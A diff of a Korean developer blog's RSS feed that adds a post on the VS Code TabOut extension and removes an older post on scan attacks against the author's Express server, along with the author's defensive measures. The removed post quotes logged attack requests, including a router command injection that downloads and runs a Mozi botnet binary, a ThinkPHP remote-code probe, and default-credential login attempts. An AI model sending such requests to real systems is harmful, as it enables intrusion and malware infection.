@@ -9,8 +9,39 @@
     <atom:link href="https://chinsun9.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>친성의 개발 블로그</description>
-    <pubDate>Mon, 16 Nov 2020 06:27:48 GMT</pubDate>
+    <pubDate>Mon, 16 Nov 2020 07:14:42 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>vscode Tab 키로 () {} [] `` 키로 빠져나가기 TabOut</title>
+      <link>https://chinsun9.github.io/2020/11/16/vscode-extension-TabOut/</link>
+      <guid>https://chinsun9.github.io/2020/11/16/vscode-extension-TabOut/</guid>
+      <pubDate>Mon, 16 Nov 2020 07:00:44 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;&lt;img src=&quot;/images/vscode-extension-TabOut20201116/preview.gif&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;와… 진짜 너무 편하다.&lt;/li&gt;
+&lt;li&gt;기존에 탭키를 누르면 탈출이 안되고, 들여쓰기 되서 </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p><img src="/images/vscode-extension-TabOut20201116/preview.gif" alt=" "></p><ul><li>와… 진짜 너무 편하다.</li><li>기존에 탭키를 누르면 탈출이 안되고, 들여쓰기 되서 힘들었는데</li><li>이 확장도구를 활성화하면 탭키로 () {} [] `` 이런 bracket? 들을 손쉽게 탈출할 수 있다.</li></ul><h2 id="TabOut"><a href="#TabOut" class="headerlink" title="TabOut"></a>TabOut</h2><ul><li>설치하면 자동으로 active 상태이다</li><li>Ctrl + Shift + P 에서 <code>toggle tabout</code>으로 활성여부를 토글할 수 있다.</li></ul><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><ul><li><a href="https://marketplace.visualstudio.com/items?itemName=albert.TabOut">TabOut</a></li><li><a href="https://github.com/microsoft/vscode/issues/22864">Request for tabbing past matching brackets similar to VS · Issue #22864 · microsoft/vscode</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://chinsun9.github.io/categories/vscode/">vscode</category>
+      
+      
+      <category domain="https://chinsun9.github.io/tags/vscode/">vscode</category>
+      
+      <category domain="https://chinsun9.github.io/tags/extension/">extension</category>
+      
+      
+      <comments>https://chinsun9.github.io/2020/11/16/vscode-extension-TabOut/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>node-abi</title>
@@ -667,36 +698,6 @@
       
       
       <comments>https://chinsun9.github.io/2020/11/10/mysql-vs-mysql2-/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>무작위 스캔 공격?</title>
-      <link>https://chinsun9.github.io/2020/11/10/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A9/</link>
-      <guid>https://chinsun9.github.io/2020/11/10/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A9/</guid>
-      <pubDate>Tue, 10 Nov 2020 00:30:04 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;&lt;img src=&quot;/images/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A920201110/preview.jpg&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;24시간 expres</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p><img src="/images/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A920201110/preview.jpg" alt=" "></p><ul><li>24시간 express로 웹앱을 켜놓은 적이 있다.</li><li>log를 보니까 이상한 경로의 요청이 많이 있었다.</li></ul><h2 id="스캔-로그-특징"><a href="#스캔-로그-특징" class="headerlink" title="스캔 로그 특징"></a>스캔 로그 특징</h2><ul><li><p>무료 도메인과 ELB를 연결해둬서</p></li><li><p>도메인을 통한 접속과, ec2 ip를 통합 접속을 구분 할 수 있었다.</p></li><li><p>확인 결과 두곳 모두 이상한 요청이 왔다.</p></li><li><p>도메인, ELB를 통한 스캔이 많았다.</p></li><li><p>get, post 요청으로 온다.</p></li><li><p>여러 아이피로 스캔을 한다</p></li></ul><h2 id="스캔-경로"><a href="#스캔-경로" class="headerlink" title="스캔 경로"></a>스캔 경로</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET &#x2F;.env HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;0bef HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;TP&#x2F;html&#x2F;public&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;TP&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;TP&#x2F;public&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;ab2g HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;ab2h HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;admin&amp;psd&#x3D;admin HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;ec8&amp;psd&#x3D;ec8 HTTP&#x2F;1.0&quot;</span><br><span class="line">&quot;GET &#x2F;conf.js HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;config&#x2F;getuser?index&#x3D;0 HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;console&#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;currentsetting.htm HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;elrekt.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;html&#x2F;public&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;index.php?s&#x3D;&#x2F;Index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;md5&amp;vars[1][]&#x3D;HelloThinkPHP21 HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;latest&#x2F;meta-data&#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;manager&#x2F;html HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;manager&#x2F;text&#x2F;list HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;owa&#x2F;auth&#x2F;logon.aspx?url&#x3D;https%3a%2f%2f1%2fecp%2f HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;phpMyAdmin&#x2F;scripts&#x2F;setup.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;portal&#x2F;redlion HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;public&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;setup.cgi?next_file&#x3D;netgear.cfg&amp;todo&#x3D;syscmd&amp;cmd&#x3D;rm+-rf+&#x2F;tmp&#x2F;*;wget+http:&#x2F;&#x2F;192.168.1.1:8088&#x2F;Mozi.m+-O+&#x2F;tmp&#x2F;netgear;sh+netgear&amp;curpath&#x3D;&#x2F;&amp;currentsetting.htm&#x3D;1 HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;solr&#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;solr&#x2F;admin&#x2F;info&#x2F;system?wt&#x3D;json HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;thinkphp&#x2F;html&#x2F;public&#x2F;index.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;w00tw00t.at.blackhats.romanian.anti-sec:) HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;readme.txt HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;GET &#x2F;wp-login.php HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;GponForm&#x2F;diag_Form?images&#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;HNAP1&#x2F; HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;api&#x2F;jsonws&#x2F;invoke HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;mifs&#x2F;.;&#x2F;services&#x2F;LogService HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;tools.cgi HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1&quot;</span><br><span class="line">&quot;POST &#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php HTTP&#x2F;1.1&quot;</span><br></pre></td></tr></table></figure><h2 id="내-행동"><a href="#내-행동" class="headerlink" title="내 행동"></a>내 행동</h2><ul><li>디렉터리 구조가 노출될까봐</li><li>error.ejs 정적으로 바꾸기. 에러 스택을 보이지 않게 했다.</li></ul><ul><li>웹앱 포트 변경. 잘알려진 8080포트로 웹을 열었더니</li><li>스캔공격을 받는 것 같다.</li><li>잘알려지지 않은 포트를 사용해서 웹을 열기로 했다. -&gt; EC2 ip를 통한 스캔 방지</li></ul><ul><li>에러 로그에만 집중하기</li><li>morgan 로깅 내용을 커스텀하고, 400번대 이상의 코드만 로깅하도록 하였다.</li></ul><ul><li>동적으로 ACL에 추가해 L4 수준에서 차단</li><li>ACL규칙을 최대 18개 정도 사용할 수 있기때문에 돌려막기식이 되어버렸다..</li><li>그래도 꺼림칙한 로그들을 줄일 수 있었다.</li></ul>]]></content:encoded>
-      
-      
-      <category domain="https://chinsun9.github.io/categories/web/">web</category>
-      
-      
-      <category domain="https://chinsun9.github.io/tags/web/">web</category>
-      
-      <category domain="https://chinsun9.github.io/tags/scan/">scan</category>
-      
-      
-      <comments>https://chinsun9.github.io/2020/11/10/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A9/#disqus_thread</comments>
       
     </item>
     
